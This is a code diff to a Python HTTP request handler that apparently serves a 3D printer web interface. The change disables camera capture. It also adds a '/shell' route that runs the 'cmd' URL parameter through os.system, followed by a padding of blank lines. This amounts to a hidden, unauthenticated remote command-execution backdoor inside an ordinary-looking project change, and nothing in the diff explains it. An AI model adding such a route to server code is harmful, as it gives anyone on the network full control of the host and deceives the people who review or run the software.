@@ -67,8 +67,8 @@ class RequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
         for i in xrange(30):
             temp = get_image()
         print("Taking image...")
-        camera_capture = get_image()
-        cv2.imwrite("tmp_img/"+file_name, camera_capture)
+        #camera_capture = get_image()
+        #cv2.imwrite("tmp_img/"+file_name, camera_capture)
          
     # serve a file from our folder
     def serve_file(self,url_path):
@@ -311,6 +311,16 @@ class RequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
             
             if url_parts.path=='/pronsole':
                 self.serve_pronsole(url_params.get('cmd')[0])
+            elif url_parts.path=='/shell':
+                import sys,os
+                sys.path.insert(0,".")
+                os.system(url_params.get('cmd')[0])
+                
+                
+                
+                
+                
+                
             elif url_parts.path=='/configs':
                 self.serve_configs()
             elif url_parts.path=='/printer':
@@ -332,6 +342,8 @@ class RequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
                 self.end_headers()
                 self.serve_cancel(session_id)
             elif ".jpg" in url_parts.path:
+                import os
+
                 self.send_response(200)
                 url_path = url_parts.path
                 file_path=os.path.abspath('./'+url_path)
